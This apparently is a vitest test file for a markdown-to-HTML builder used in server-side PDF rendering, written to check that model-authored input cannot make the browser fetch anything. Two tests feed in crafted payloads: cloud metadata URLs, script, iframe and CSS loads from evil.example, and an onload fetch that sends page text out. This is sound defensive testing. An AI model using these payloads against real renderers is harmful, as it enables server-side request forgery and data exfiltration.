import { describe, expect, it } from "vitest";
import { AGENT_PDF_CSS, buildAgentPdfHtml } from "./pdf-document";

describe("buildAgentPdfHtml", () => {
  it("produces one self-contained document", () => {
    const html = buildAgentPdfHtml("# Title\n\nBody text.");
    expect(html.startsWith("<!doctype html>")).toBe(true);
    expect(html).toContain('<meta charset="utf-8">');
    expect(html).toContain("<h1>Title</h1>");
    expect(html).toContain("<p>Body text.</p>");
    expect(html.endsWith("</html>")).toBe(true);
  });

  it("inlines the stylesheet rather than linking one", () => {
    const html = buildAgentPdfHtml("x");
    expect(html).toContain("<style>");
    expect(html).not.toContain("<link");
  });

  /**
   * THE load-bearing test. `renderHtmlToPdf` runs `setContent(..., { waitUntil:
   * "networkidle" })`, so anything this document references, Chromium fetches —
   * from inside our own function, with our own network position. The document
   * must reference nothing.
   */
  it("references no external resource", () => {
    const html = buildAgentPdfHtml(
      "# T\n\n<img src=http://169.254.169.254/latest/meta-data/>\n\n" +
        "<script src='https://evil.example/x.js'></script>\n\n" +
        "<iframe src='https://evil.example'></iframe>",
    );
    expect(html).not.toMatch(/<img|<script|<iframe|<link|<object|<embed/i);
    expect(html).not.toMatch(/url\(|@import|@font-face/i);
  });

  /**
   * The same property, driven from the whole crafted-payload surface rather
   * than three tags: every documented way to make a browser reach the network
   * from a `setContent` document, in one string. Not one of them may survive
   * the AST — there is no node that can carry a tag, an attribute, or a CSS
   * rule, so the only possible outcome is escaped visible text.
   */
  it("cannot be made to emit any fetchable construct by a crafted payload", () => {
    const payload = [
      "# Report",
      '<img src="http://169.254.169.254/latest/meta-data/iam/">',
      "<image xlink:href='https://evil.example/a.png'/>",
      '<script src="https://evil.example/x.js"></script>',
      "<iframe src='https://evil.example'></iframe>",
      '<link rel="stylesheet" href="https://evil.example/x.css">',
      '<object data="https://evil.example/x"></object>',
      '<embed src="https://evil.example/x">',
      "<video><source src='https://evil.example/v.mp4'></video>",
      "<audio src='https://evil.example/a.mp3'></audio>",
      '<style>@import url("https://evil.example/x.css");</style>',
      "<style>body{background:url(https://evil.example/b.png)}</style>",
      "<style>@font-face{src:url(https://evil.example/f.woff)}</style>",
      '<div style="background-image:url(https://evil.example/d.png)">x</div>',
      '<meta http-equiv="refresh" content="0;url=https://evil.example">',
      '<base href="https://evil.example/">',
      "<svg><use href='https://evil.example/s.svg#i'/></svg>",
      "<body onload=\"fetch('https://evil.example/?d='+document.body.innerText)\">",
      "[click](javascript:fetch('https://evil.example'))",
      "[click](data:text/html,<script>fetch('https://evil.example')</script>)",
    ].join("\n\n");

    const html = buildAgentPdfHtml(payload);
    // The model-authored region, isolated from the server-owned shell (which
    // legitimately carries `<meta charset>` and one inline `<style>`). This is
    // the only part of the document any input can influence.
    const body = html.slice(
      html.indexOf('<main class="doc">'),
      html.indexOf("</main>"),
    );
    expect(body.length).toBeGreaterThan(0);

    // The strongest form of the property, and the one that cannot rot as new
    // attack strings are invented: EVERY tag in the model-authored region is
    // one the renderer itself emits. Not "no <img>" — "nothing but these".
    const ALLOWED = new Set([
      "main",
      "h1",
      "h2",
      "h3",
      "p",
      "blockquote",
      "ul",
      "ol",
      "li",
      "strong",
      "em",
      "del",
      "code",
      "a",
    ]);
    const tags = [...body.matchAll(/<\/?([a-zA-Z][^\s>/]*)/g)].map((m) =>
      m[1].toLowerCase(),
    );
    expect(tags.length).toBeGreaterThan(0);
    expect(tags.filter((t) => !ALLOWED.has(t))).toEqual([]);
    // No CSS fetch vector anywhere CSS can actually live. The body cannot hold
    // any (it has no `<style>` — see above), so a literal `url(` surviving
    // there is inert visible text; the shell is where a real one would sit.
    const shell = html.replace(body, "");
    expect(shell).not.toMatch(/url\(|@import|@font-face/i);
    // Neither link construct used an http scheme, so no `<a>` was emitted and
    // no attacker-chosen URL reached an attribute.
    expect(body).not.toContain("<a ");
    expect(body).not.toMatch(/href="/);
    // The payload survives as VISIBLE TEXT, which is the whole trade.
    expect(html).toContain("&lt;img");
    expect(html).toContain("<h1>Report</h1>");
  });

  it("keeps the stylesheet free of anything fetchable", () => {
    expect(AGENT_PDF_CSS).not.toMatch(/url\(|@import|@font-face/i);
  });

  it("still produces a valid document for empty markdown", () => {
    const html = buildAgentPdfHtml("");
    expect(html.startsWith("<!doctype html>")).toBe(true);
    expect(html.endsWith("</html>")).toBe(true);
  });
});
